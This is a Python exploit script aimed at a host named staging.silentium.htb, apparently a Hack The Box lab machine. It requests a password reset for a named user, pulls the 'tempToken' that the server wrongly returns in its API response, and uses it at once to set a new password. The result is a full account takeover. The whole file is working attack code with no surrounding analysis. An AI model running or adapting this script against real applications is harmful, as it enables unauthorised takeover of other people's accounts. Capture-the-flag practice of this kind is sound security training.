#!/usr/bin/env python3
import requests
import sys

def find_temp_token(data):
    """Recursively search for 'tempToken' in the JSON response."""
    if isinstance(data, dict):
        if 'tempToken' in data:
            return data['tempToken']
        for value in data.values():
            token = find_temp_token(value)
            if token:
                return token
    elif isinstance(data, list):
        for item in data:
            token = find_temp_token(item)
            if token:
                return token
    return None

def exploit():
    target = "http://staging.silentium.htb"
    email = "ben@silentium.htb"
    new_password = "Password@123"

    headers = {"Content-Type": "application/json"}

    print(f"[*] Triggering token leak for: {email}")
    payload1 = {"user": {"email": email}}
    
    # Step 1: Leak the token
    r1 = requests.post(f"{target}/api/v1/account/forgot-password", headers=headers, json=payload1)
    
    # Check for both 200 and 201 success codes
    if r1.status_code not in [200, 201]:
        print(f"[-] Failed to trigger reset. Status: {r1.status_code}")
        print(f"[-] Response: {r1.text}")
        return

    token = find_temp_token(r1.json())
    if not token:
        print("[-] Could not find 'tempToken' in the API response.")
        print(f"[-] Full Response: {r1.text}")
        return

    print(f"[+] Leaked tempToken: {token}")
    print("[*] Immediately sending password reset request...")

    # Step 2: Flattened payload
    payload2 = {
        "tempToken": token,
        "password": new_password,
        "confirmPassword": new_password
    }

    # Send the reset request instantly
    r2 = requests.post(f"{target}/api/v1/account/reset-password", headers=headers, json=payload2)
    
    if r2.status_code in [200, 201]:
        print("\n[+] ========================================================")
        print("[+] PASSWORD RESET SUCCESSFUL!")
        print(f"[+] Email:    {email}")
        print(f"[+] Password: {new_password}")
        print("[+] ========================================================")
    else:
        print(f"\n[-] Reset failed. Status Code: {r2.status_code}")
        print(f"[-] Response: {r2.text}")

if __name__ == "__main__":
    exploit()